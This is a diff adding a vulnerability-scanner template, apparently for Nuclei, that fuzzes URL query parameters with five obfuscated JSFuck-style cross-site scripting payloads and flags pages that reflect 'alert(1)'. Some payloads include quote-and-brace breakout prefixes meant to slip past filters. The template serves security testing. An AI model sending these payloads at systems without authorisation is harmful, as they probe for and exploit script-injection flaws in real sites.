@@ -1,0 +1,40 @@
+id: jsfuck-xss
+
+info:
+  name: JSfuck XSS
+  author: reewardius
+  severity: medium
+  tags: fuzzing-xss,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      js:
+        - "A=![]+'';B=!![]+'';C=[][[]]+'';F=[][C[4]+C[5]+A[2]+B[0]+A[4]+B[1]];D=F+'';F[D[3]+D[6]+C[1]+A[3]+B[0]+B[1]+C[0]+D[3]+B[0]+D[6]+B[1]](A[1]+A[2]+A[4]+B[1]+B[0]+'(1)')()//"
+        - "%27}});A=![]+'';B=!![]+'';C=[][[]]+'';F=[][C[4]+C[5]+A[2]+B[0]+A[4]+B[1]];D=F+'';F[D[3]+D[6]+C[1]+A[3]+B[0]+B[1]+C[0]+D[3]+B[0]+D[6]+B[1]](A[1]+A[2]+A[4]+B[1]+B[0]+'(1)')()//"
+        - "%22}});A=![]+'';B=!![]+'';C=[][[]]+'';F=[][C[4]+C[5]+A[2]+B[0]+A[4]+B[1]];D=F+'';F[D[3]+D[6]+C[1]+A[3]+B[0]+B[1]+C[0]+D[3]+B[0]+D[6]+B[1]](A[1]+A[2]+A[4]+B[1]+B[0]+'(1)')()//"
+        - "%22};A=![]+'';B=!![]+'';C=[][[]]+'';F=[][C[4]+C[5]+A[2]+B[0]+A[4]+B[1]];D=F+'';F[D[3]+D[6]+C[1]+A[3]+B[0]+B[1]+C[0]+D[3]+B[0]+D[6]+B[1]](A[1]+A[2]+A[4]+B[1]+B[0]+'(1)')()//"
+        - "%27};A=![]+'';B=!![]+'';C=[][[]]+'';F=[][C[4]+C[5]+A[2]+B[0]+A[4]+B[1]];D=F+'';F[D[3]+D[6]+C[1]+A[3]+B[0]+B[1]+C[0]+D[3]+B[0]+D[6]+B[1]](A[1]+A[2]+A[4]+B[1]+B[0]+'(1)')()//"
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{js}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "alert(1)"
+        part: body
+        
+      - type: word
+        part: header
+        words:
+          - text/html
